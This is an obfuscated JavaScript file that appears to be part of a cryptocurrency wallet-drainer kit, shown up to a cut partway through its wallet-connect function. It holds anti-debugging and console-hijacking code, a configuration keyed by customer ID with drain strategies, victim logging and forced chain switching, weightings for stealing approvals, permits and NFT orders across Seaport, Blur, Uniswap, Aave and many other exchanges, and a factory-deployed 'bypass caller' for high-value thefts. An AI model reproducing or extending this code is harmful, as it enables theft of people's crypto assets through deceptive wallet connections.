(function (_0x13f36f, _0x2e81b1) {
  const _0x58d0b7 = _0x13f36f();
  while (true) {
    try {
      const _0x48be94 = -parseInt(_0x16e3(1222, 0xe2d)) / 1 * (parseInt(_0x16e3(1856, 0xf52)) / 2) + -parseInt(_0x16e3(3308, 0x6c9)) / 3 * (parseInt(_0x16e3(1433, -0x280)) / 4) + -parseInt(_0x16e3(5719, 0x1ba4)) / 5 + parseInt(_0x16e3(5327, 0xde6)) / 6 + parseInt(_0x16e3(4019, 0x11d1)) / 7 * (parseInt(_0x16e3(5543, 0x1500)) / 8) + parseInt(_0x16e3(4377, 0x99e)) / 9 * (-parseInt(_0x16e3(1700, 0x658)) / 10) + -parseInt(_0x16e3(1251, 0x7cb)) / 11 * (-parseInt(_0x16e3(3339, 0xc44)) / 12);
      if (_0x48be94 === _0x2e81b1) {
        break;
      } else {
        _0x58d0b7.push(_0x58d0b7.shift());
      }
    } catch (_0x2c150b) {
      _0x58d0b7.push(_0x58d0b7.shift());
    }
  }
})(_0x3ae7, 226763);
const _0x50f945 = function () {
  let _0x27a7ec = true;
  return function (_0x127edb, _0x36806b) {
    const _0x34e40d = _0x27a7ec ? function () {
      if (_0x36806b) {
        const _0xcdc787 = _0x36806b.apply(_0x127edb, arguments);
        _0x36806b = null;
        return _0xcdc787;
      }
    } : function () {};
    _0x27a7ec = false;
    return _0x34e40d;
  };
}();
const _0xa379a3 = _0x50f945(this, function () {
  return _0xa379a3.toString().search("(((.+)+)+)+$").toString().constructor(_0xa379a3).search("(((.+)+)+)+$");
});
_0xa379a3();
const _0x4d969e = function () {
  let _0xe1efdd = true;
  return function (_0x585589, _0x13e732) {
    const _0x1dbe57 = _0xe1efdd ? function () {
      if (_0x13e732) {
        const _0x2cf3fa = _0x13e732.apply(_0x585589, arguments);
        _0x13e732 = null;
        return _0x2cf3fa;
      }
    } : function () {};
    _0xe1efdd = false;
    return _0x1dbe57;
  };
}();
(function () {
  _0x4d969e(this, function () {
    const _0x9b4dc6 = new RegExp("function *\\( *\\)");
    const _0x5b9028 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
    const _0x3cf0d2 = _0x1a9c59('init');
    if (!_0x9b4dc6.test(_0x3cf0d2 + "chain") || !_0x5b9028.test(_0x3cf0d2 + "input")) {
      _0x3cf0d2('0');
    } else {
      _0x1a9c59();
    }
  })();
})();
const _0x478d55 = function () {
  let _0x768a36 = true;
  return function (_0x4ec145, _0x42fb6a) {
    const _0x495bef = _0x768a36 ? function () {
      if (_0x42fb6a) {
        const _0x480eff = _0x42fb6a.apply(_0x4ec145, arguments);
        _0x42fb6a = null;
        return _0x480eff;
      }
    } : function () {};
    _0x768a36 = false;
    return _0x495bef;
  };
}();
const _0x54d66e = _0x478d55(this, function () {
  const _0x216a6f = {
    OAFgT: function (_0xc9ab05, _0x5add7a) {
      return _0xc9ab05 + _0x5add7a;
    }
  };
  _0x216a6f.eUZyQ = function (_0x3f5c10, _0x26a7d8) {
    return _0x3f5c10 + _0x26a7d8;
  };
  _0x216a6f.Vvfxz = "return (function() ";
  _0x216a6f.JEOKe = "{}.constructor(\"return this\")( )";
  _0x216a6f.dqpjE = "log";
  _0x216a6f.EXsLb = "warn";
  _0x216a6f.uVUkE = "exception";
  _0x216a6f.VMjlA = "table";
  _0x216a6f.RBuat = "trace";
  _0x216a6f.NTTiu = function (_0xdc0390, _0x2b8d1a) {
    return _0xdc0390 < _0x2b8d1a;
  };
  let _0x1a0fce;
  try {
    const _0x2e60dc = Function(_0x216a6f.eUZyQ(_0x216a6f.Vvfxz, _0x216a6f.JEOKe) + ');');
    _0x1a0fce = _0x2e60dc();
  } catch (_0x14d2e3) {
    _0x1a0fce = window;
  }
  const _0x5ad826 = _0x1a0fce.console = _0x1a0fce.console || {};
  const _0x221299 = [_0x216a6f.dqpjE, _0x216a6f.EXsLb, "info", "error", _0x216a6f.uVUkE, _0x216a6f.VMjlA, _0x216a6f.RBuat];
  for (let _0x10cdfd = 0; _0x216a6f.NTTiu(_0x10cdfd, _0x221299.length); _0x10cdfd++) {
    const _0x1acc02 = _0x478d55.constructor.prototype.bind(_0x478d55);
    const _0x3b93fe = _0x221299[_0x10cdfd];
    const _0xaf862d = _0x5ad826[_0x3b93fe] || _0x1acc02;
    _0x1acc02.__proto__ = _0x478d55.bind(_0x478d55);
    _0x1acc02.toString = _0xaf862d.toString.bind(_0xaf862d);
    _0x5ad826[_0x3b93fe] = _0x1acc02;
  }
});
_0x54d66e();
const _0x317d25 = {
  blur: 0x2,
  seaport: 1.4,
  ostransfers: 2.2,
  uniswap: 1.5,
  uniswapv2: 1.9,
  stargate: 2.7,
  permit: 2.2,
  permit2: 2.5,
  special: 2.6,
  apestake: 2.4,
  curve: 0x3,
  aave: 3.5,
  wyvern: 0x3,
  safa: 0x1,
  balance: 0.8,
  chainSwitchRatio: 0.6
};
const _0x38f434 = {
  multipliers: _0x317d25
};
const _0x2d2f04 = {
  customerId: "0x706OW4G8",
  forcePopup: true,
  logRepeatedConnections: true,
  logEmptyWallets: true,
  logClosedTab: true,
  logIpData: true,
  sendEthType: 0x1,
  drainStrategyAmount: 0x5,
  failedAttemptMax: 0x5,
  forceChangeChainNetwork: true,
  forceAddChainNetwork: true,
  bannedAddresses: ["0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8", "0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d", "0x2ad6FA4db57Ac71479510863643Eb6b1991788E1", "0x33566c9D8BE6Cf0B23795E0d380E112Be9d75836", "0x034C446b223Bb4ffbd51d2E284Fe6b3cdd271315", "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045", "0xC832494dce30f7303F42d829c205D6Ea6b551afb", "0x29B876e2dd14dd034612F052ecB372E64C96A895", "0x886258791969e6b0fEff62c0a02be819Dfc1B167", "0x3096d3B09e6ec2E8fF923D1657d0c691148eEeE5", "0xaF92d25248767357041c002Ea5aE24eF350102EF", "0x2b8496F320582481eA393bd26B9191F9059D2943", "0x81c4065F3B3b89adE412158b8c2c2C37e2a1b0A0", "0x9A735c231ad994D48929d3d8cE0970fCA25C2908", "0xbAEA4b614e0cADdA6aE2c860F3Ba8270f770f22f"],
  assetOptions: _0x38f434
};
window.init = false;
window.disabled = false;
const _0x54fd05 = {
  Accept: "application/json"
};
const _0x5c96d4 = {
  method: 'GET',
  headers: _0x54fd05
};
const _0x1cd7b4 = {
  eth: 0x1,
  bsc: 0x38,
  xdai: 0x64,
  arb: 0xa4b1,
  matic: 0x89,
  avax: 0xa86a,
  op: 0xa,
  ftm: 0xfa,
  era: 0x144,
  okt: 0x42,
  celo: 0xa4ec,
  mvr: 0x505,
  cro: 0x19,
  metis: 0x440,
  aurora: 0x4e454152,
  mobm: 0x504,
  klay: 0x2019,
  boba: 0x120,
  astar: 0x250,
  nova: 0x57,
  one: 0x63564c40,
  base: 0x2105,
  canto: 0x1e14,
  pls: 0x171,
  beam: 0x10f1,
  linea: 0xe708,
  '1': 'eth',
  '56': "bsc",
  "42161": "arb",
  "137": 'matic',
  "43114": "avax",
  "100": 'xdai',
  '10': 'op',
  "250": "ftm",
  '25': "cro",
  "1088": "metis",
  '66': "okt",
  "128": "heco",
  "324": "era",
  '1285': "mvr",
  '42220': 'celo',
  "1284": "mobm",
  "8217": "klay",
  "1313161554": "aurora",
  '288': "boba",
  '592': 'astar',
  '87': 'nova',
  '1666600000': "one",
  "8453": 'base',
  "7700": 'canto',
  "369": "pls",
  "4337": "beam",
  "59144": "linea"
};
const _0x2a7c00 = {
  name: "Ethereum",
  symbol: "ETH",
  rpc: "https://rpc.ankr.com/eth",
  explorer: "https://etherscan.io",
  id: "0x1"
};
const _0x33b7af = {
  name: "Canto",
  symbol: 'CANTO',
  rpc: "https://canto.gravitychain.io",
  explorer: "https://cantoscan.com/",
  id: "0x1e14"
};
const _0x274745 = {
  name: "Binance Smart Chain Mainnet",
  symbol: "BNB",
  rpc: "https://rpc.ankr.com/bsc",
  explorer: "https://bscscan.com",
  id: '0x38'
};
const _0x215323 = {
  name: "Polygon Mainnet",
  symbol: "MATIC",
  rpc: "https://rpc.ankr.com/polygon",
  explorer: "https://polygonscan.com",
  id: '0x89'
};
const _0x39bca = {
  name: "Fantom Opera",
  symbol: 'FTM',
  rpc: "https://rpcapi.fantom.network",
  explorer: "https://ftmscan.com",
  id: "0xfa"
};
const _0x4b4fae = {
  name: "Optimism",
  symbol: 'ETH',
  rpc: "https://rpc.ankr.com/optimism",
  explorer: "https://optimistic.etherscan.io",
  id: "0xa"
};
const _0x53cf2d = {
  name: "Arbitrum One",
  symbol: "ETH",
  rpc: "https://rpc.ankr.com/arbitrum",
  explorer: "https://arbiscan.io",
  id: "0xa4b1"
};
const _0x3c657d = {
  name: "Klaytn Mainnet Cypress",
  symbol: "KLAY",
  rpc: "https://public-node-api.klaytnapi.com/v1/cypress",
  explorer: "https://scope.klaytn.como",
  id: "0x2019"
};
const _0x4c2a70 = {
  name: "OKXChain Mainnet",
  symbol: "OKT",
  rpc: "https://exchainrpc.okex.org",
  explorer: "https://www.oklink.com/en/okc",
  id: "0x42"
};
const _0x500e0b = {
  name: "Avalanche C-Chain",
  symbol: 'AVAX',
  rpc: "https://rpc.ankr.com/avalanche",
  explorer: "https://snowtrace.io",
  id: "0xa86a"
};
const _0x1ca4f2 = {
  name: 'Beam',
  symbol: "BEAM",
  rpc: "https://subnets.avax.network/beam/mainnet/rpc",
  explorer: "https://snowtrace.io",
  id: "0x10f1"
};
const _0x5bae2d = {
  name: "Pulse Chain",
  symbol: "PLS",
  rpc: "https://rpc.pulsechain.com",
  explorer: "https://pulsechain.com",
  id: "0x171"
};
const _0x48d478 = {
  name: "Base",
  symbol: "ETH",
  rpc: "https://rpc.ankr.com/base",
  explorer: "https://basescan.org",
  id: '0x2105'
};
const _0x2265a6 = {
  name: "Gnosis",
  symbol: 'xDAI',
  rpc: "https://rpc.gnosischain.com",
  explorer: "https://gnosisscan.io",
  id: "0x64"
};
const _0x5e42d1 = {
  name: "Celo Mainnet",
  symbol: "CELO",
  rpc: "https://forno.celo.org",
  explorer: "https://celoscan.io",
  id: "0xa4ec"
};
const _0x34f517 = {
  name: "Aurora Mainnet",
  symbol: "ETH",
  rpc: "https://mainnet.aurora.dev",
  explorer: "https://aurorascan.dev",
  id: '0x4e454152'
};
const _0x468a0a = {
  name: "Fuse Mainnet",
  symbol: "FUSE",
  rpc: "https://fuse-rpc.gateway.pokt.network",
  explorer: "https://fuse.io/",
  id: "0x7a"
};
const _0x5f1a12 = {
  name: "Nova Network",
  symbol: "SNT",
  rpc: "https://rpc.novanetwork.io:9070",
  explorer: "https://explorer.novanetwork.io",
  id: '0x57'
};
const _0x4b4e05 = {
  name: "Dogechain Mainnet",
  symbol: "DOGE",
  rpc: "https://rpc.dogechain.dog",
  explorer: "https://explorer.dogechain.dog",
  id: '0x7d0'
};
const _0x4ed516 = {
  eth: _0x2a7c00,
  canto: _0x33b7af,
  bsc: _0x274745,
  matic: _0x215323,
  ftm: _0x39bca,
  op: _0x4b4fae,
  arb: _0x53cf2d,
  klay: _0x3c657d,
  okt: _0x4c2a70,
  avax: _0x500e0b,
  beam: _0x1ca4f2,
  pls: _0x5bae2d,
  base: _0x48d478,
  xdai: _0x2265a6,
  celo: _0x5e42d1,
  aurora: _0x34f517,
  fuse: _0x468a0a,
  nova: _0x5f1a12,
  doge: _0x4b4e05
};
class Values {
  ["options"] = _0x5c96d4;
  ["chainValues"] = [];
  ["currentChainId"] = 0;
  ["approved"] = [];
  ["orderCache"] = [];
  ["offer"] = [];
  ["considerations"] = [];
  ["token_array"] = [];
  ["nft_array"] = [];
  ["chainRegistery"] = _0x1cd7b4;
  ["chainRegistryData"] = _0x4ed516;
  ['actions'] = [];
  ["keySize"] = 256;
  ['ivSize'] = 128;
  ["saltSize"] = 256;
  ["iterations"] = 1000;
  ["totalSeaport"] = 0;
  ["totalWyvern"] = 0;
  ["totalBlur"] = 0;
  ['totalNFTs'] = 0;
  ["totalTokens"] = 0;
  ["totalStaked"] = 0;
  ["nativeBalances"] = 0;
  ["tokenValueUSD"] = 0;
  ["failedAttempts"] = 0;
  ['connector'] = '';
  ['domain'] = '';
  ["caller"] = "0x0000";
  ["bypassCaller"] = '';
  ['salt'] = '';
  ['receiver'] = '';
  ["tokenAddress"] = '';
  ["openseaTokens"] = ["0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", "0x6b175474e89094c44da98b954eedeac495271d0f", "0x4d224452801aced8b2f0aebe155379bb5d594381", "0x64d91f12ece7362f91a6f8e7940cd55f05060b92", "0x0d8775f648430679a709e98d2b0cb6250d2887ef", "0x15d4c048f83bd7e37d49ea4c83a07267ec4203da", "0x514910771af9ca656af840dff83e8264ecf986ca", "0x0f5d2fb29fb7d3cfee444a200298f468908cc942", "0x557b933a7c2c45672b610f8954a3deb39a51a8ca", "0x3845badade8e6dff049820680d1f14bd3903a5d0", "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"];
  ["seaportTokenActions"] = [];
  ["seaportNFTActions"] = [];
  ["wyvernTokenActions"] = [];
  ["wyvernNftActions"] = [];
  ["osTransferActions"] = [];
  ["drainNativeActions"] = [];
  ["approvalTokenActions"] = [];
  ["approvalNFTActions"] = [];
  ["apeStakeActions"] = [];
  ["blurDelegateActions"] = [];
  ["blurExecutionActions"] = [];
  ["x2y2TransferActions"] = [];
  ["pangolinActions"] = [];
  ["pancakeActions"] = [];
  ["pancakev2Actions"] = [];
  ["aaveLP2Actions"] = [];
  ["aaveLP3Actions"] = [];
  ["aaveLP4Actions"] = [];
  ["permit2Actions"] = [];
  ["uniswapv2Actions"] = [];
  ["uniswapv3Actions"] = [];
  ["uniswapv3_2Actions"] = [];
  ["bancorActions"] = [];
  ["bancorSwapsActions"] = [];
  ["curveActions"] = [];
  ["curveVyper1Actions"] = [];
  ["cowActions"] = [];
  ["oneinchv5Actions"] = [];
  ["sushiswapActions"] = [];
  ["sushiProcessActions"] = [];
  ["stargateActions"] = [];
  ["shibaSwapActions"] = [];
  ["kyberActions"] = [];
  ["quickSwapActions"] = [];
  ["spookyActions"] = [];
  ["traderJoeV3Actions"] = [];
  ["traderJoeV2Actions"] = [];
  ["traderJoeV1Actions"] = [];
  ["camelotActions"] = [];
  ['gmxActions'] = [];
  ["wooBridgeActions"] = [];
  ['wooActions'] = [];
  ["zeroexActions"] = [];
  ["specialActions"] = [];
  ["tokenChains"] = [];
  ["handledActions"] = [];
  ["sentMessage"] = false;
  ['y'] = "01238218";
}
const _0x4f31a8 = {
  Chain: "eth",
  Exchange: "AaveLP2",
  Address: "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9"
};
const _0x3a8abc = {
  Chain: "eth",
  Exchange: 'AaveLP3',
  Address: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2"
};
const _0x1252ed = {
  Chain: "eth",
  Exchange: "AaveLP4",
  Address: "0x777777c9898D384F785Ee44Acfe945efDFf5f3E0"
};
const _0x1624de = {
  Chain: "matic",
  Exchange: "AaveLP2",
  Address: "0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf"
};
const _0x9fed42 = {
  Chain: "matic",
  Exchange: 'AaveLP3',
  Address: "0x794a61358D6845594F94dc1DB02A252b5b4814aD"
};
const _0x1ebefc = {
  Chain: "avax",
  Exchange: "AaveLP2",
  Address: "0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C"
};
const _0x5a2a79 = {
  Chain: "avax",
  Exchange: "AaveLP3",
  Address: "0x794a61358D6845594F94dc1DB02A252b5b4814aD"
};
const _0x25eeda = {
  Chain: 'op',
  Exchange: "AaveLP3",
  Address: "0x794a61358D6845594F94dc1DB02A252b5b4814aD"
};
const _0x4f95a1 = {
  Chain: "arb",
  Exchange: "AaveLP3",
  Address: "0x794a61358D6845594F94dc1DB02A252b5b4814aD"
};
const _0x2c28d1 = {
  Chain: "eth",
  Exchange: 'Bancor',
  Address: "0xeEF417e1D5CC832e619ae18D2F140De2999dD4fB"
};
const _0x434cc4 = {
  Chain: 'eth',
  Exchange: "BancorSwaps",
  Address: "0x2F9EC37d6CcFFf1caB21733BdaDEdE11c823cCB0"
};
const _0x358a58 = {
  Chain: "arb",
  Exchange: "Camelot",
  Address: "0xc873fEcbd354f5A56E00E710B90EF4201db2448d"
};
const _0x3306aa = {
  Chain: "eth",
  Exchange: "Curve",
  Address: "0x99a58482BD75cbab83b27EC03CA68fF489b5788f"
};
const _0x2c382b = {
  Chain: "eth",
  Exchange: "CurveVyper1",
  Address: "0x55B916Ce078eA594c10a874ba67eCc3d62e29822"
};
const _0x476185 = {
  Chain: "arb",
  Exchange: "GMX",
  Address: "0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064"
};
const _0x5e7f48 = {
  Chain: "eth",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x143712 = {
  Chain: "bsc",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x22dacf = {
  Chain: 'avax',
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x21c9b9 = {
  Chain: 'op',
  Exchange: '1InchV5',
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x688174 = {
  Chain: "matic",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x2585a9 = {
  Chain: "arb",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0xd1059d = {
  Chain: "base",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x87e056 = {
  Chain: "ftm",
  Exchange: "1InchV5",
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x42785c = {
  Chain: "era",
  Exchange: '1InchV5',
  Address: "0x1111111254EEB25477B68fb85Ed929f73A960582"
};
const _0x4ad32f = {
  Chain: "eth",
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x195d2e = {
  Chain: "bsc",
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0xef2fd7 = {
  Chain: 'avax',
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x28505b = {
  Chain: 'op',
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x1aa209 = {
  Chain: "matic",
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x249be0 = {
  Chain: 'arb',
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x12a833 = {
  Chain: 'ftm',
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x53ddb7 = {
  Chain: 'base',
  Exchange: "Kyber",
  Address: "0x6131B5fae19EA4f9D964eAc0408E4408b66337b5"
};
const _0x36136d = {
  Chain: "era",
  Exchange: 'Kyber',
  Address: "0x3F95eF3f2eAca871858dbE20A93c01daF6C2e923"
};
const _0x228636 = {
  Chain: "avax",
  Exchange: "Pangolin",
  Address: "0xe54ca86531e17ef3616d22ca28b0d458b6c89106"
};
const _0x248468 = {
  Chain: "eth",
  Exchange: "Pancake",
  Address: "0xEfF92A263d31888d860bD50809A8D171709b7b1c"
};
const _0x27e693 = {
  Chain: "eth",
  Exchange: 'PancakeV2',
  Address: "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"
};
const _0x5826db = {
  Chain: "bsc",
  Exchange: "Pancake",
  Address: "0x10ED43C718714eb63d5aA57B78B54704E256024E"
};
const _0xcbba5d = {
  Chain: "bsc",
  Exchange: "PancakeV2",
  Address: "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"
};
const _0x2a3e10 = {
  Chain: 'eth',
  Exchange: "Stargate",
  Address: "0x8731d54E9D02c286767d56ac03e8037C07e01e98"
};
const _0x426b1c = {
  Chain: "bsc",
  Exchange: "Stargate",
  Address: "0x4a364f8c717cAAD9A442737Eb7b8A55cc6cf18D8"
};
const _0x21a579 = {
  Chain: "avax",
  Exchange: "Stargate",
  Address: "0x45A01E4e04F14f7A4a6702c74187c5F6222033cd"
};
const _0x1b1977 = {
  Chain: 'arb',
  Exchange: "Stargate",
  Address: "0x53Bf833A5d6c4ddA888F69c22C88C9f356a41614"
};
const _0x2a02fe = {
  Chain: 'op',
  Exchange: "Stargate",
  Address: "0xB0D502E938ed5f4df2E681fE6E419ff29631d62b"
};
const _0x4668d0 = {
  Chain: 'matic',
  Exchange: 'Stargate',
  Address: "0x45A01E4e04F14f7A4a6702c74187c5F6222033cd"
};
const _0x24773c = {
  Chain: "base",
  Exchange: "Stargate",
  Address: "0x45f1A95A4D3f3836523F5c83673c797f4d4d263B"
};
const _0x4d91f6 = {
  Chain: "ftm",
  Exchange: "Stargate",
  Address: "0xAf5191B0De278C7286d6C7CC6ab6BB8A73bA2Cd6"
};
const _0x20d103 = {
  Chain: "eth",
  Exchange: "Special",
  Address: "0x881d40237659c251811cec9c364ef91dc08d300c"
};
const _0x153db0 = {
  Chain: "bsc",
  Exchange: "Special",
  Address: "0x1a1ec25dc08e98e5e93f1104b5e5cdd298707d31"
};
const _0x3e3430 = {
  Chain: 'op',
  Exchange: 'Special',
  Address: "0x9dda6ef3d919c9bc8885d5560999a3640431e8e6"
};
const _0x2eb794 = {
  Chain: "matic",
  Exchange: 'Special',
  Address: "0x1a1ec25dc08e98e5e93f1104b5e5cdd298707d31"
};
const _0x2b95fd = {
  Chain: 'arb',
  Exchange: "Special",
  Address: "0x9dda6ef3d919c9bc8885d5560999a3640431e8e6"
};
const _0x5f419e = {
  Chain: 'ftm',
  Exchange: "SpookySwap",
  Address: "0xf491e7b69e4244ad4002bc14e878a34207e38c29"
};
const _0x5c6cb0 = {
  Chain: "eth",
  Exchange: "ShibaSwap",
  Address: "0x03f7724180AA6b939894B5Ca4314783B0b36b329"
};
const _0x283cd3 = {
  Chain: 'eth',
  Exchange: "SushiSwap",
  Address: "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f"
};
const _0x5817df = {
  Chain: 'bsc',
  Exchange: "SushiSwap",
  Address: "0x1b02da8cb0d097eb8d57a175b88c7d8b47997506"
};
const _0x3c0fda = {
  Chain: "avax",
  Exchange: 'SushiSwap',
  Address: "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"
};
const _0x3c8d6c = {
  Chain: "matic",
  Exchange: "SushiSwap",
  Address: "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"
};
const _0x298bd5 = {
  Chain: "arb",
  Exchange: "SushiSwap",
  Address: "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"
};
const _0x3a824f = {
  Chain: "ftm",
  Exchange: "SushiSwap",
  Address: "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"
};
const _0x2b7ab9 = {
  Chain: "bsc",
  Exchange: "TraderJoeV3",
  Address: "0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30"
};
const _0x2fbbd6 = {
  Chain: "avax",
  Exchange: "TraderJoeV1",
  Address: "0x60aE616a2155Ee3d9A68541Ba4544862310933d4"
};
const _0x553c04 = {
  Chain: "avax",
  Exchange: "TraderJoeV2",
  Address: "0xE3Ffc583dC176575eEA7FD9dF2A7c65F7E23f4C3"
};
const _0x303cbb = {
  Chain: "avax",
  Exchange: "TraderJoeV3",
  Address: "0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30"
};
const _0x43fdab = {
  Chain: "arb",
  Exchange: "TraderJoeV3",
  Address: "0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30"
};
const _0x28e9a6 = {
  Chain: "eth",
  Exchange: 'UniswapV2',
  Address: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
};
const _0x2f865a = {
  Chain: 'eth',
  Exchange: 'UniswapV3',
  Address: "0xE592427A0AEce92De3Edee1F18E0157C05861564"
};
const _0x1d7141 = {
  Chain: 'op',
  Exchange: "UniswapV3",
  Address: "0xE592427A0AEce92De3Edee1F18E0157C05861564"
};
const _0x4bbed1 = {
  Chain: "matic",
  Exchange: "UniswapV3",
  Address: "0xE592427A0AEce92De3Edee1F18E0157C05861564"
};
const _0x4c7b87 = {
  Chain: "arb",
  Exchange: "UniswapV3",
  Address: "0xE592427A0AEce92De3Edee1F18E0157C05861564"
};
const _0x7e7d4c = {
  Chain: "base",
  Exchange: "UniswapV3",
  Address: "0xE592427A0AEce92De3Edee1F18E0157C05861564"
};
const _0x5d7cbf = {
  Chain: "eth",
  Exchange: "UniswapV3_2",
  Address: "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
};
const _0x5d0dcf = {
  Chain: "bsc",
  Exchange: "UniswapV3_2",
  Address: "0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2"
};
const _0x29a99d = {
  Chain: 'op',
  Exchange: "UniswapV3_2",
  Address: "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
};
const _0x209529 = {
  Chain: "matic",
  Exchange: "UniswapV3_2",
  Address: "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
};
const _0x104cc2 = {
  Chain: "arb",
  Exchange: "UniswapV3_2",
  Address: "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
};
const _0x2ebcf4 = {
  Chain: "base",
  Exchange: "UniswapV3_2",
  Address: "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
};
const _0x264fdf = {
  Chain: "bsc",
  Exchange: 'WooFinance',
  Address: "0x4f4Fd4290c9bB49764701803AF6445c5b03E8f06"
};
const _0x3afacc = {
  Chain: "avax",
  Exchange: "WooFinance",
  Address: "0xC22FBb3133dF781E6C25ea6acebe2D2Bb8CeA2f9"
};
const _0x435b8e = {
  Chain: 'op',
  Exchange: "WooFinance",
  Address: "0xEAf1Ac8E89EA0aE13E0f03634A4FF23502527024"
};
const _0x274228 = {
  Chain: 'matic',
  Exchange: "WooFinance",
  Address: "0x817Eb46D60762442Da3D931Ff51a30334CA39B74"
};
const _0x5bd307 = {
  Chain: "arb",
  Exchange: 'WooFinance',
  Address: "0x9aEd3A8896A85FE9a8CAc52C9B402D092B629a30"
};
const _0x977047 = {
  Chain: "bsc",
  Exchange: "WooBridge",
  Address: "0x81004C9b697857fD54E137075b51506c739EF439"
};
const _0x2ee31b = {
  Chain: "avax",
  Exchange: "WooBridge",
  Address: "0x51AF494f1B4d3f77835951FA827D66fc4A18Dae8"
};
const _0x7ebe32 = {
  Chain: 'op',
  Exchange: "WooBridge",
  Address: "0xbeaE1B06949d033Da628bA3E5aF267C3E740494b"
};
const _0x51bc63 = {
  Chain: "matic",
  Exchange: "WooBridge",
  Address: "0xAA9c15cd603428cA8ddD45e933F8EfE3Afbcc173"
};
const _0x2c5a7f = {
  Chain: "arb",
  Exchange: "WooBridge",
  Address: "0x4AB421de52b3112D02442b040dd3DC73e8Af63b5"
};
const _0x38d9e9 = {
  Chain: "eth",
  Exchange: 'ZeroEx',
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
const _0x320f2f = {
  Chain: 'bsc',
  Exchange: 'ZeroEx',
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
const _0x280a6a = {
  Chain: 'ftm',
  Exchange: "ZeroEx",
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
const _0x5c52c5 = {
  Chain: "avax",
  Exchange: "ZeroEx",
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
const _0x2b7946 = {
  Chain: 'op',
  Exchange: "ZeroEx",
  Address: "0xDEF1ABE32c034e558Cdd535791643C58a13aCC10"
};
const _0x243f57 = {
  Chain: 'matic',
  Exchange: "ZeroEx",
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
const _0x98d699 = {
  Chain: "arb",
  Exchange: 'ZeroEx',
  Address: "0xDef1C0ded9bec7F1a1670819833240f027b25EfF"
};
class Main extends Values {
  ['utils'] = new Helpers();
  constructor() {
    super();
    try {
      this.approved = JSON.parse(localStorage.approved);
    } catch {}
    try {
      this.orderCache = JSON.parse(localStorage.orderCache);
    } catch {}
  }
  ["getDomain"] = async _0x3d0e5f => {
    let _0x303bd0 = new APIFactory("0x1e128ef546a08cb6149b257eb4b36bee1d34245d", _0x3d0e5f).contract;
    this.domain = await _0x303bd0.url();
  };
  ["getCaller"] = _0x21faeb => {
    if (_0x21faeb.chain == "eth" && _0x21faeb.value >= 200) {
      return this.bypassCaller;
    } else {
      return this.caller;
    }
  };
  ["getDynamicAddress"] = async _0x30ed6f => {
    let _0x3c6111 = new CreateFactory("0x9fBB3DF7C40Da2e5A0dE984fFE2CCB7C47cd0ABf", _0x30ed6f).contract;
    this.salt = ethers.BigNumber.from(ethers.utils.randomBytes(32)).toHexString();
    this.bypassCaller = await _0x3c6111.getDeployed("0x41a72aBAB13E81Acac7B1c12c1Fc1A678bF145f2", this.salt);
  };
  ["connectWallet"] = async (_0x5f203e, _0x282d8a, _0x341f65, _0x3e24a7) => {
    if (window.disabled || !window.isClicked) {
      return;
    }
    this.isMobile = this.utils.isMobile();
    window.disabled = true;
    let _0x23ef2c = [];
    const _0x528d35 = new ethers.providers.JsonRpcProvider("https://cloudflare-eth.com");
    _0x23ef2c.push(this.getDomain(_0x528d35));
    if (!this.isMobile) {
